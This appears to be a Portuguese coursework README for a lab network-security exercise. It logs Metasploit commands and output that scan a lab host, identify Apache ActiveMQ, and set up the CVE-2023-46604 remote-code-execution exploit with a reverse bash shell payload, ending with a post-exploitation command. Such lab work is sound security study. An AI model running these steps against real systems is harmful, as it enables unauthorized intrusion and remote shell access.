# Segurança de redes 2023

Repositório onde será desenvolvido um trabalho prático sobre segurança de redes e exploit de vulnerabilidade

msfconsole

search -h

search type:auxiliary name:scan

search type:auxiliary name:port scan

<!--
  Matching Modules
  ================

    #   Name                                                            Disclosure Date  Rank    Check  Description
    -   ----                                                            ---------------  ----    -----  -----------
    0   auxiliary/scanner/acpp/login                                                     normal  No     Apple Airport ACPP Authentication Scanner
    1   auxiliary/scanner/http/cisco_firepower_download                 2016-10-10       normal  No     Cisco Firepower Management Console 6.0 Post Auth Report Download Directory Traversal
    2   auxiliary/scanner/http/cisco_ironport_enum                                       normal  No     Cisco Ironport Bruteforce Login Utility
    3   auxiliary/scanner/scada/digi_realport_serialport_scan                            normal  No     Digi RealPort Serial Server Port Scanner
    4   auxiliary/scanner/scada/digi_realport_version                                    normal  No     Digi RealPort Serial Server Version
    5   auxiliary/scanner/http/es_file_explorer_open_port               2019-01-16       normal  No     ES File Explorer Open Port
    6   auxiliary/scanner/portscan/ftpbounce                                             normal  No     FTP Bounce Port Scanner
    7   auxiliary/scanner/http/hp_imc_reportimgservlt_traversal                          normal  No     HP Intelligent Management ReportImgServlt Directory Traversal
    8   auxiliary/scanner/http/http_hsts                                                 normal  No     HTTP Strict Transport Security (HSTS) Detection
    9   auxiliary/scanner/http/infovista_enum                                            normal  No     InfoVista VistaPortal Application Bruteforce Login Utility
    10  auxiliary/scanner/http/support_center_plus_directory_traversal  2014-01-28       normal  No     ManageEngine Support Center Plus Directory Traversal
    11  auxiliary/scanner/natpmp/natpmp_portscan                                         normal  No     NAT-PMP External Port Scanner
    12  auxiliary/scanner/http/openmind_messageos_login                                  normal  No     OpenMind Message-OS Portal Login Brute Force Utility
    13  auxiliary/scanner/portmap/portmap_amp                                            normal  No     Portmapper Amplification Scanner
    14  auxiliary/scanner/sap/sap_router_portscanner                                     normal  No     SAPRouter Port Scanner
    15  auxiliary/scanner/http/squid_pivot_scanning                                      normal  No     Squid Proxy Port Scanner
    16  auxiliary/scanner/misc/sunrpc_portmapper                                         normal  No     SunRPC Portmap Program Enumerator
    17  auxiliary/scanner/http/smt_ipmi_49152_exposure                  2014-06-19       normal  No     Supermicro Onboard IPMI Port 49152 Sensitive File Exposure
    18  auxiliary/scanner/portscan/xmas                                                  normal  No     TCP "XMas" Port Scanner
    19  auxiliary/scanner/portscan/tcp                                                   normal  No     TCP Port Scanner
    20  auxiliary/scanner/portscan/syn                                                   normal  No     TCP SYN Port Scanner
-->

use auxiliary/scanner/portscan/tcp

show options

<!--
  Module options (auxiliary/scanner/portscan/tcp):

    Name         Current Setting  Required  Description
    ----         ---------------  --------  -----------
    CONCURRENCY  10               yes       The number of concurrent ports to check per host
    DELAY        0                yes       The delay between connections, per thread, in milliseconds
    JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
    PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
    RHOSTS       172.16.123.5     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
    THREADS      1                yes       The number of concurrent threads (max one per host)
    TIMEOUT      1000             yes       The socket connect timeout in milliseconds


  View the full module info with the info, or info -d command.
-->

show options

<!--
       Name: TCP Port Scanner
     Module: auxiliary/scanner/portscan/tcp
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  hdm <x@hdm.io>
  kris katterjohn <katterjohn@gmail.com>

Check supported:
  No

Basic options:
  Name         Current Setting  Required  Description
  ----         ---------------  --------  -----------
  CONCURRENCY  10               yes       The number of concurrent ports to check per host
  DELAY        0                yes       The delay between connections, per thread, in milliseconds
  JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
  PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
  RHOSTS       172.16.123.5     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
  THREADS      1                yes       The number of concurrent threads (max one per host)
  TIMEOUT      1000             yes       The socket connect timeout in milliseconds

Description:
  Enumerate open TCP services by performing a full TCP connect on each port.
  This does not need administrative privileges on the source machine, which
  may be useful if pivoting.


View the full module info with the info -d command.
 -->

set RHOSTS 172.16.123.5

set THREADS 4

set PORTS 1-30000

run

<!--
[+] 172.16.123.5:         - 172.16.123.5:1883 - TCP OPEN
[+] 172.16.123.5:         - 172.16.123.5:5672 - TCP OPEN
[+] 172.16.123.5:         - 172.16.123.5:8161 - TCP OPEN
[*] 172.16.123.5:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
-->

db_nmap -h

db_nmap -sV -sC -A -p 1883,5672,8161 172.16.123.5

<!--
[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-27 01:02 UTC
[*] Nmap: Nmap scan report for activemq.subnetwork (172.16.123.5)
[*] Nmap: Host is up (0.00012s latency).
[*] Nmap: PORT     STATE SERVICE VERSION
[*] Nmap: 1883/tcp open  mqtt
[*] Nmap: | mqtt-subscribe:
[*] Nmap: |   Topics and their most recent payloads:
[*] Nmap: |     ActiveMQ/Advisory/MasterBroker:
[*] Nmap: |_    ActiveMQ/Advisory/Consumer/Topic/#:
[*] Nmap: 5672/tcp open  amqp?
[*] Nmap: |_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
[*] Nmap: | fingerprint-strings:
[*] Nmap: |   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie:
[*] Nmap: |     AMQP
[*] Nmap: |     AMQP
[*] Nmap: |     amqp:decode-error
[*] Nmap: |_    7Connection from client using unsupported AMQP attempted
[*] Nmap: 8161/tcp open  http    Jetty 9.4.39.v20210325
[*] Nmap: | http-auth:
[*] Nmap: | HTTP/1.1 401 Unauthorized\x0D
[*] Nmap: |_  basic realm=ActiveMQRealm
[*] Nmap: |_http-title: Error 401 Unauthorized
[*] Nmap: |_http-server-header: Jetty(9.4.39.v20210325)
[*] Nmap: 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
[*] Nmap: SF-Port5672-TCP:V=7.94SVN%I=7%D=11/27%Time=6563EAB6%P=x86_64-pc-linux-gnu%
[*] Nmap: SF:r(GetRequest,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\
[*] Nmap: SF:x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S
[*] Nmap: SF:\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x2
[*] Nmap: SF:0client\x20using\x20unsupported\x20AMQP\x20attempted")%r(HTTPOptions,89
[*] Nmap: SF:,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04
[*] Nmap: SF:\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0
[*] Nmap: SF:M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client\x20usin
[*] Nmap: SF:g\x20unsupported\x20AMQP\x20attempted")%r(RTSPRequest,89,"AMQP\x03\x01\
[*] Nmap: SF:0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\
[*] Nmap: SF:0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11am
[*] Nmap: SF:qp:decode-error\xa17Connection\x20from\x20client\x20using\x20unsupporte
[*] Nmap: SF:d\x20AMQP\x20attempted")%r(RPCCheck,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\
[*] Nmap: SF:0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0
[*] Nmap: SF:`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa
[*] Nmap: SF:17Connection\x20from\x20client\x20using\x20unsupported\x20AMQP\x20attem
[*] Nmap: SF:pted")%r(DNSVersionBindReqTCP,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\
[*] Nmap: SF:x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\
[*] Nmap: SF:0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Conn
[*] Nmap: SF:ection\x20from\x20client\x20using\x20unsupported\x20AMQP\x20attempted")
[*] Nmap: SF:%r(DNSStatusRequestTCP,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02
[*] Nmap: SF:\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0
[*] Nmap: SF:S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\
[*] Nmap: SF:x20from\x20client\x20using\x20unsupported\x20AMQP\x20attempted")%r(SSLS
[*] Nmap: SF:essionReq,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10
[*] Nmap: SF:\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x0
[*] Nmap: SF:1\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20cl
[*] Nmap: SF:ient\x20using\x20unsupported\x20AMQP\x20attempted")%r(TerminalServerCoo
[*] Nmap: SF:kie,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x
[*] Nmap: SF:0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x
[*] Nmap: SF:1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client\x
[*] Nmap: SF:20using\x20unsupported\x20AMQP\x20attempted");
[*] Nmap: MAC Address: 02:42:AC:10:7B:05 (Unknown)
[*] Nmap: Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
[*] Nmap: Device type: general purpose
[*] Nmap: Running: Linux 4.X|5.X
[*] Nmap: OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
[*] Nmap: OS details: Linux 4.15 - 5.8
[*] Nmap: Network Distance: 1 hop
[*] Nmap: TRACEROUTE
[*] Nmap: HOP RTT     ADDRESS
[*] Nmap: 1   0.12 ms activemq.subnetwork (172.16.123.5)
[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 32.44 seconds
-->

search type:exploit name:activemq
<!--
Matching Modules
================

   #  Name                                                   Disclosure Date  Rank       Check  Description
   -  ----                                                   ---------------  ----       -----  -----------
   0  exploit/multi/http/apache_activemq_upload_jsp          2016-06-01       excellent  No     ActiveMQ web shell upload
   1  exploit/windows/http/apache_activemq_traversal_upload  2015-08-19       excellent  Yes    Apache ActiveMQ 5.x-5.11.1 Directory Traversal Shell Upload
   2  exploit/multi/misc/apache_activemq_rce_cve_2023_46604  2023-10-27       excellent  Yes    Apache ActiveMQ Unauthenticated Remote Code Execution
   3  exploit/windows/browser/samsung_security_manager_put   2016-08-05       excellent  No     Samsung Security Manager 1.4 ActiveMQ Broker Service PUT Method Remote Code Execution


Interact with a module by name or index. For example info 3, use 3 or use exploit/windows/browser/samsung_security_manager_put
 -->

search type:exploit name:amqp
<!--
Matching Modules
================

   #  Name                                                  Disclosure Date  Rank       Check  Description
   -  ----                                                  ---------------  ----       -----  -----------
   0  exploit/windows/misc/solarwinds_amqp_deserialization  2022-10-19       excellent  No     SolarWinds Information Service (SWIS) .NET Deserialization From AMQP RCE


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/misc/solarwinds_amqp_deserialization
 -->

search type:exploit name:jetty
<!--
[-] No results from search
 -->

search type:exploit name:eclipse
<!--
Matching Modules
================

   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  exploit/multi/misc/osgi_console_exec  2018-02-13       normal  Yes    Eclipse Equinox OSGi Console Command Execution

Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/misc/osgi_console_exec
 -->

use exploit/multi/misc/apache_activemq_rce_cve_2023_46604

<!--
Module options (exploit/windows/misc/solarwinds_amqp_deserialization):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   yes       The password to authenticate with
   RHOSTS                     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     5671             yes       The target port
   USERNAME  orion            yes       The username to authenticate with


Payload options (cmd/windows/http/x64/meterpreter/reverse_tcp):

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   EXITFUNC            process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   FETCH_COMMAND       CERTUTIL         yes       Command to fetch payload (Accepted: CURL, TFTP, CERTUTIL)
   FETCH_DELETE        false            yes       Attempt to delete the binary after execution
   FETCH_FILENAME      LDJdkCjdQhP      no        Name to use on remote system when storing payload; cannot contain spaces.
   FETCH_SRVHOST                        no        Local IP to use for serving payload
   FETCH_SRVPORT       8080             yes       Local port to use for serving payload
   FETCH_URIPATH                        no        Local URI to use for serving payload
   FETCH_WRITABLE_DIR  %TEMP%           yes       Remote writable dir to store payload; cannot contain spaces.
   LHOST               172.16.123.6     yes       The listen address (an interface may be specified)
   LPORT               4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
 -->

use exploit/multi/misc/apache_activemq_rce_cve_2023_46604
<!--
[*] No payload configured, defaulting to cmd/windows/http/x64/meterpreter/reverse_tcp
 -->

show options

<!--
Module options (exploit/multi/misc/apache_activemq_rce_cve_2023_46604):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    61616            yes       The target port (TCP)
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen
                                       on all addresses.
   SRVPORT  8080             yes       The local port to listen on.
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)


Payload options (cmd/windows/http/x64/meterpreter/reverse_tcp):

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   EXITFUNC            process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   FETCH_COMMAND       CERTUTIL         yes       Command to fetch payload (Accepted: CURL, TFTP, CERTUTIL)
   FETCH_DELETE        false            yes       Attempt to delete the binary after execution
   FETCH_FILENAME      TjFLxxOi         no        Name to use on remote system when storing payload; cannot contain spaces.
   FETCH_SRVHOST                        no        Local IP to use for serving payload
   FETCH_SRVPORT       8080             yes       Local port to use for serving payload
   FETCH_URIPATH                        no        Local URI to use for serving payload
   FETCH_WRITABLE_DIR  %TEMP%           yes       Remote writable dir to store payload; cannot contain spaces.
   LHOST               172.16.123.6     yes       The listen address (an interface may be specified)
   LPORT               4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows



View the full module info with the info, or info -d command.
 -->

show info

<!--
       Name: Apache ActiveMQ Unauthenticated Remote Code Execution
     Module: exploit/multi/misc/apache_activemq_rce_cve_2023_46604
   Platform: Windows, Linux, Unix
       Arch: cmd
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2023-10-27

Provided by:
  X1r0z
  sfewer-r7

Module side effects:
 ioc-in-logs

Module stability:
 crash-safe

Module reliability:
 repeatable-session

Available targets:
      Id  Name
      --  ----
  =>  0   Windows
      1   Linux
      2   Unix

Check supported:
  Yes

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
  RPORT    61616            yes       The target port (TCP)
  SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen o
                                      n all addresses.
  SRVPORT  8080             yes       The local port to listen on.
  SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
  URIPATH                   no        The URI to use for this exploit (default is random)

Payload information:

Description:
  This module exploits a deserialization vulnerability in the OpenWire transport unmarshaller in Apache
  ActiveMQ. Affected versions include 5.18.0 through to 5.18.2, 5.17.0 through to 5.17.5, 5.16.0 through to
  5.16.6, and all versions before 5.15.16.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2023-46604
  https://github.com/X1r0z/ActiveMQ-RCE
  https://exp10it.cn/2023/10/apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-rce-%E5%88%86%E6%9E%90/
  https://attackerkb.com/topics/IHsgZDE3tS/cve-2023-46604/rapid7-analysis
  https://activemq.apache.org/security-advisories.data/CVE-2023-46604-announcement.txt


View the full module info with the info -d command.
 -->

set RHOSTS 172.16.123.5

set SRVPORT 1234

set TARGET Unix

show payloads

set PAYLOAD payload/cmd/unix/reverse_bash

show options

exploit

ls -la /opt/activemq | grep activemq && echo "\n finished"
